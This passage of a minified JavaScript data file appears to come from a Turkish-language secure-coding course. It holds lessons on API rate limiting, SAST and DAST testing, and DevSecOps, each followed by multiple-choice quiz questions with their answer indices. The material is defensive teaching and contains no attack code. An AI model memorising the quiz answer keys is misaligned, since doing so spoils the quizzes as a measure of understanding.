olmamas\u0131n\u0131n siber g\xFCvenlik a\xE7\u0131s\u0131ndan en b\xFCy\xFCk riski nedir?",options:["Sunucu IP adresinin de\u011Fi\u015Fmesi","Sald\u0131rganlar\u0131n kaba kuvvet (brute-force) veya kaynak t\xFCketim sald\u0131r\u0131lar\u0131n\u0131 s\u0131n\u0131rs\u0131z istekle otomatikle\u015Ftirebilmesi","API'nin JSON d\xF6nmemesi","SSL hatas\u0131 \xE7\u0131kmas\u0131"],correct:1},{q:"SMS g\xF6nderme API'sini suistimal eden bir sald\u0131rgan\u0131n yapt\u0131\u011F\u0131 SMS bombalama sald\u0131r\u0131s\u0131n\u0131 engellemek i\xE7in hangisi uygulanmal\u0131d\u0131r?",options:["\u015Eifreleme","IP ve telefon numaras\u0131 bazl\u0131 istek s\u0131kl\u0131\u011F\u0131 s\u0131n\u0131rlamas\u0131 (Rate Limit)","Yeni bir SMS sunucusu almak","SMS metnini uzatmak"],correct:1},{q:"API g\xFCvenli\u011Finde kimlik do\u011Frulama i\xE7in genellikle HTTP ba\u015Fl\u0131\u011F\u0131nda (Header) ne ta\u015F\u0131n\u0131r?",options:["HTML kodu","Bearer Token (\xF6rn. JWT)","Kullan\u0131c\u0131 ad\u0131 ve \u015Fifre a\xE7\u0131k metin olarak","MAC Adresi"],correct:1}]},{id:"uyg-29",title:"G\xFCvenli Kod Analizi (SAST/DAST)",content:"<h2>G\xFCvenli Kod Analizi (SAST ve DAST)</h2><p>Uygulamalar yay\u0131na al\u0131nmadan \xF6nce g\xFCvenlik a\xE7\u0131klar\u0131n\u0131n tespit edilmesi i\xE7in iki temel test metodolojisi kullan\u0131l\u0131r:</p><p><strong>SAST (Static Application Security Testing - Statik Test):</strong> Uygulama \xE7al\u0131\u015Ft\u0131r\u0131lmadan, kaynak kod d\xFCzeyinde analiz edilir (White-box). Kod sat\u0131rlar\u0131ndaki zafiyetli fonksiyonlar (\xF6rn. `system()`, parametresiz SQL sorgular\u0131) otomatik taran\u0131r.</p><p><strong>DAST (Dynamic Application Security Testing - Dinamik Test):</strong> Uygulama \xE7al\u0131\u015F\u0131r durumdayken, d\u0131\u015Far\u0131dan girdi enjekte edilerek test edilir (Black-box). Sunucu yan\u0131tlar\u0131 analiz edilerek XSS, SQLi gibi a\xE7\u0131klar aran\u0131r.</p>",example:"<h3>Ara\xE7lar:</h3><p>SAST i\xE7in SonarQube, DAST i\xE7in ise OWASP ZAP veya Burp Suite Scanner gibi pop\xFCler g\xFCvenlik analiz ara\xE7lar\u0131 kullan\u0131l\u0131r.</p>",questions:[{q:"Uygulaman\u0131n kaynak kodlar\u0131n\u0131 \xE7al\u0131\u015Ft\u0131rmadan, statik olarak analiz ederek g\xFCvenlik a\xE7\u0131klar\u0131n\u0131 bulan test y\xF6ntemine ne ad verilir?",options:["DAST","SAST","Pentest","Fuzzing"],correct:1},{q:"DAST (Dinamik G\xFCvenlik Testi) y\xF6ntemi uygulamay\u0131 hangi bak\u0131\u015F a\xE7\u0131s\u0131yla test eder?",options:["Beyaz Kutu (White-box - kaynak kodu g\xF6rerek)","Kara Kutu (Black-box - uygulama \xE7al\u0131\u015F\u0131rken d\u0131\u015Far\u0131dan test ederek)","Kod sat\u0131rlar\u0131n\u0131 tek tek inceleyerek","Veritaban\u0131n\u0131 do\u011Frudan silerek"],correct:1},{q:"A\u015Fa\u011F\u0131dakilerden hangisi pop\xFCler bir DAST (Dinamik G\xFCvenlik Testi) arac\u0131d\u0131r?",options:["SonarQube","OWASP ZAP","ESLint","Git"],correct:1}]},{id:"uyg-30",title:"DevSecOps ve G\xFCvenli Ya\u015Fam D\xF6ng\xFCs\xFC",content:"<h2>DevSecOps ve G\xFCvenli Yaz\u0131l\u0131m Ya\u015Fam D\xF6ng\xFCs\xFC</h2><p>Geleneksel yaz\u0131l\u0131m s\xFCre\xE7lerinde g\xFCvenlik, yaz\u0131l\u0131m bittikten sonra en son a\u015Famada (s\u0131zma testiyle) kontrol edilirdi. Bu durum hem maliyetli hem de ge\xE7 kal\u0131nm\u0131\u015F g\xFCvenlik a\xE7\u0131klar\u0131na yol a\xE7ard\u0131.</p><p><strong>DevSecOps:</strong> G\xFCvenli\u011Fin, yaz\u0131l\u0131m geli\u015Ftirme (Dev) ve operasyon (Ops) s\xFCre\xE7lerinin en ba\u015F\u0131ndan itibaren her a\u015Famaya (kod yaz\u0131m\u0131, derleme, test, canl\u0131ya alma) otomatik olarak entegre edilmesidir (Shift-Left - G\xFCvenli\u011Fi Sola \xC7ekmek).</p>",example:"<h3>CI/CD Pipeline:</h3><p>DevSecOps uygulanan bir projede, geli\u015Ftirici kodu GitHub'a g\xF6nderdi\u011Fi anda, otomatik \xE7al\u0131\u015Fan CI/CD ara\xE7lar\u0131 kodu g\xFCvenlik a\xE7\u0131klar\u0131na (SAST), ba\u011F\u0131ml\u0131l\u0131k a\xE7\u0131klar\u0131na (SCA) kar\u015F\u0131 tarar ve hata varsa yay\u0131n\u0131 engeller.</p>",questions:[{q:"Yaz\u0131l\u0131m geli\u015Ftirme s\xFCre\xE7lerinde g\xFCvenli\u011Fin en ba\u015F\u0131ndan itibaren otomatik ara\xE7larla her a\u015Famaya entegre edilmesini savunan k\xFClt\xFCr ve yakla\u015F\u0131m hangisidir?",options:["DevOps","DevSecOps","Agile","WaterFall"],correct:1},{q:"DevSecOps felsefesinde yer alan 'Shift-Left' (G\xFCvenli\u011Fi Sola \xC7ekmek) kavram\u0131n\u0131n anlam\u0131 nedir?",options:["Kodlar\u0131 sol tarafa yazmak","G\xFCvenlik kontrollerini yaz\u0131l\u0131m ya\u015Fam d\xF6ng\xFCs\xFCn\xFCn en erken a\u015Famalar\u0131na (tasar\u0131m ve kodlama) kayd\u0131rmak","Sadece sol el kullanan geli\u015Ftiricileri i\u015Fe almak","G\xFCvenli\u011Fi en son ad\u0131ma b\u0131rakmak"],correct:1},{q:"A\u015Fa\u011F\u0131dakilerden hangisi bir DevSecOps boru hatt\u0131nda (pipeline) otomatik olarak yap\u0131lmas\u0131 gereken taramalardan biri de\u011Fildir?",options:["Kaynak kod g\xFCvenli\u011Fi taramas\u0131 (SAST)","Kullan\u0131lan k\xFCt\xFCphanelerin g\xFCvenlik a\xE7\u0131\u011F\u0131 taramas\u0131 (SCA)","Kullan\u0131c\u0131lar\u0131n ki\u015Fisel bilgisayarlar\u0131n\u0131n antivir\xFCs taramas\u0131","Konteyner (Docker) imaj taramas\u0131"],correct:2}]}]};})();
